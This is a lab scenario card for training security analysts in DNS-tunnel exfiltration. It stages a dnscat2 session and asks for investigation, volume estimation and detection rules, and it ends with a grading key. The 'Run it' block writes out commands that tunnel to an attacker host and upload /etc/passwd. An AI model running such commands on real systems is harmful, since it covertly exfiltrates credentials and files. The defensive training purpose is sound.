# S09 — Exfiltration over DNS

**Tier 3 · ATT&CK: T1048.003 (Exfil over Alt Protocol), T1071.004 (DNS)**

## Story
Data left `vic-lin`, but not over any obvious channel. It was smuggled out inside DNS queries. Prove exfil happened, estimate how much left, and identify the channel.

## Lab setup
- `vic-lin` (victim) + attacker running a DNS tunneling server (`dnscat2` or `iodine`) on `kali`, authoritative for a lab domain like `t.lab`.
- Capture: `tcpdump -i any -w ~/captures/s09.pcap 'udp port 53'` on `vic-lin`, and enable DNS query logging if you run a resolver. Keep the pcap on the victim; raw captures never go to the public cases repo.

## Run it
```bash
# on kali (server)
dnscat2-server t.lab
# on vic-lin (client) - tunnel and push a file
dnscat2 --dns server=10.10.10.5,domain=t.lab
# inside the session: upload /etc/passwd or a seeded 'secrets.txt'
```
Randomize file size and query rate so "how much left" is a real estimate.

## Cleanup / revert
Kill the tunnel, revert to `baseline`. Keep the pcap on the victim as evidence. It stays lab-local; the write-up describes it, but the file itself never lands in the public repo.

## What telemetry this generates
- **pcap / DNS logs**: a flood of queries for long, high-entropy, base32/hex subdomains under `t.lab` (`a3f9c1...e2.t.lab`). Abnormal length, abnormal volume, one domain, TXT/NULL/CNAME record types.
- **Wazuh**: won't flag this out of the box, which is a deliberate lesson. You may see the process (`dnscat2`) via auditd, but the *channel* only shows in the pcap/DNS telemetry.

## Your investigation (fill cold)
What made these queries abnormal (length? entropy? volume? record type? single destination domain)? Estimate bytes exfiltrated from query count × payload-per-query. Which domain/server received it? Why did host-based alerting stay quiet, and what data source would you *need* to catch this? Decode a sample subdomain if you can.

## Detection engineering
A detection on DNS query length/entropy thresholds, or query volume to a single second-level domain over a window. This is where you learn Wazuh needs a DNS log source it doesn't have by default. Writing that gap into the case (and adding the log source) is the real deliverable. Optionally a Sigma rule for DNS-tunneling patterns.

<details>
<summary>Grading key: don't open until your verdict is written</summary>

- Sealed truth: the tool, the domain, the file exfiltrated, the approximate byte count, and the query rate.
- **Good:** you characterize the tunnel from packet features (length, entropy, volume, and record type), estimate the volume with your arithmetic shown, name the destination, and explain the host-based blind spot correctly. Bonus for a partial decode of a query payload.
- **Miss:** "lots of DNS queries" without the why-abnormal. Normal DNS is short, cached, and diverse; this is long, unique, and single-domain. That contrast is the finding.
</details>
